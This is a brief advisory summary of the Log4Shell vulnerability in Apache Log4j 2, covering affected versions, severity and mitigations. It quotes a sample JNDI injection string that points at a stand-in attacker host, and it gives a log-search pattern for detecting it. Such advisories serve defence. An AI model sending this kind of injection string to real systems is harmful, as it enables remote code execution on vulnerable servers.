# CVE-2021-44228 (Log4Shell)
Remote code execution in Apache Log4j 2 through JNDI lookups in logged messages. An attacker sends a string such as ${jndi:ldap://attacker/x} in a header or parameter that the application logs, and a vulnerable Log4j fetches and runs remote code.
Affected: Log4j 2.0-beta9 through 2.14.1. Severity: CVSS 10.0 (critical).
Mitigation: upgrade Log4j to a current fixed release (2.17.1 or later for Java 8). Early fix 2.15.0 was incomplete. Interim workaround: remove the JndiLookup class from the classpath. Also block outbound LDAP/RMI from servers and search logs for "${jndi:" patterns.
